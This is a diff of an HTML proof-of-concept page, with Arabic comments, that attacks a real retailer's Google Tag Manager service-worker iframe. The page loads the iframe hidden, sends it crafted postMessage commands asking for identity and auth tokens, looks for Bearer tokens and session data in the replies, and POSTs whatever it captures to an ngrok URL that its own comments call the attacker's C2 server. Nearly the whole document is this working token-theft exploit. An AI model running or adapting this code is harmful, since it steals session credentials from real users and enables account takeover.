@@ -1,50 +1,91 @@
 <!DOCTYPE html>
-<html>
-<body style="background: #111; color: #0f0;">
-    <h1>جاري استجواب المحرك (Service Worker Interrogation)...</h1>
-    
-    <iframe id="sw_bridge" 
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ PoC: Token Exfiltration via SW Bridge</title>
+    <style>
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        .terminal { background: #000; border: 1px solid #00ff41; padding: 20px; height: 400px; overflow-y: auto; box-shadow: 0 0 20px rgba(0,255,65,0.2); }
+        .log-entry { margin-bottom: 10px; border-bottom: 1px dotted #222; }
+        .token-found { color: #ff003c; font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 0% {opacity:1;} 50% {opacity:0.3;} 100% {opacity:1;} }
+        h2 { color: #fff; text-transform: uppercase; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+
+    <h2>نظام استغلال جسر Zooplus</h2>
+    <div class="terminal" id="terminal">
+        <div class="log-entry">> جاري تهيئة نظام الاستغلال...</div>
+    </div>
+
+    <iframe id="sw_bridge" name="google_tag_manager_static_20" 
             src="https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=https://egyhaker.github.io&1p=1" 
-            style="width:0; height:0; border:none;"></iframe>
+            style="display:none;"></iframe>
 
     <script>
+        const terminal = document.getElementById('terminal');
         const bridge = document.getElementById('sw_bridge');
+        const NGROK_URL = "https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/token-leak";
 
-        // وظيفة لإرسال رسالة إلى الـ Service Worker عبر الإطار الوسيط
-        function sendToSW(command) {
-            console.log("[➔] إرسال أمر للـ SW:", command);
-            bridge.contentWindow.postMessage(command, "https://stm.zooplus.com");
+        function log(msg, isCritical = false) {
+            const div = document.createElement('div');
+            div.className = 'log-entry';
+            if (isCritical) div.classList.add('token-found');
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            terminal.appendChild(div);
+            terminal.scrollTop = terminal.scrollHeight;
         }
 
-        window.addEventListener("message", function(event) {
-            // التحقق من أن الرسالة من الجسر
+        // 1. التنصت على الرسائل القادمة من الجسر
+        window.addEventListener("message", (event) => {
             if (event.origin.includes("zooplus.com")) {
-                console.log("%c[📥] رد مستلم من الـ SW:", "color: #00ffff; font-weight: bold;");
-                console.log(event.data);
+                log("📥 رد مستلم من الجسر: " + JSON.stringify(event.data).substring(0, 100) + "...");
+                
+                // فحص ما إذا كان الرد يحتوي على التوكن أو معلومات الهوية
+                if (event.data.stats || event.data.data) {
+                    log("🔓 تم كشف بيانات الجلسة (targetId): " + (event.data.stats?.targetId || "Unknown"), true);
+                    
+                    // محاولة استخراج التوكن إذا تم تمريره في الـ data
+                    if (JSON.stringify(event.data).includes("Bearer")) {
+                        log("🔥 تم صيد Access Token بنجاح!", true);
+                    }
 
-                // إرسال الصيد لسيرفرك
-                fetch("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/sw-capture", {
-                    method: "POST",
-                    body: JSON.stringify({
-                        origin: event.origin,
-                        payload: event.data
-                    })
-                });
+                    // 2. تهريب الصيد إلى سيرفر المهاجم (C2 Server)
+                    fetch(NGROK_URL, {
+                        method: "POST",
+                        mode: "no-cors",
+                        body: JSON.stringify({
+                            source: "SW_Relay_Exploit",
+                            payload: event.data,
+                            full_url: window.location.href
+                        })
+                    }).then(() => log("🚀 تم إرسال البيانات إلى سيرفر Ngrok."));
+                }
             }
         });
 
-        // الانتظار حتى يتم تحميل الإطار ثم البدء في الاستجواب
+        // 3. بدء الهجوم عند تحميل الجسر
         bridge.onload = () => {
-            console.log("[!] الجسر جاهز. يبدأ الاستجواب...");
-            
-            // محاولة 1: طلب الحالة العامة
-            sendToSW({ type: 'GET_STATE' });
+            log("✅ الجسر (sw_iframe) تم تحميله بنجاح.");
+            log("📡 جاري محاكاة أوامر البروتوكول لسحب التوكن...");
 
-            // محاولة 2: طلب بيانات المستخدم (Common pattern in Google/GTM SWs)
-            sendToSW({ type: 'GET_USER_DATA' });
+            const targetWindow = bridge.contentWindow;
 
-            // محاولة 3: طلب التوكنات المخزنة في الـ Cache
-            sendToSW({ type: 'FETCH_AUTH_TOKENS' });
+            // إرسال سلسلة أوامر متتابعة لاستنطاق الـ Service Worker
+            const payloads = [
+                { type: 0, clientId: 'attack-v01', data: 'status_check' },
+                { type: 0, clientId: 'attack-v01', data: 'identity_request' },
+                { type: 0, clientId: 'attack-v01', data: 'get_auth_token' },
+                { type: 'gtm.ready', data: {} }
+            ];
+
+            payloads.forEach((payload, index) => {
+                setTimeout(() => {
+                    log(`[➔] إرسال أمر #${index + 1}...`);
+                    targetWindow.postMessage(payload, "https://stm.zooplus.com");
+                }, 1500 * (index + 1));
+            });
         };
     </script>
 </body>
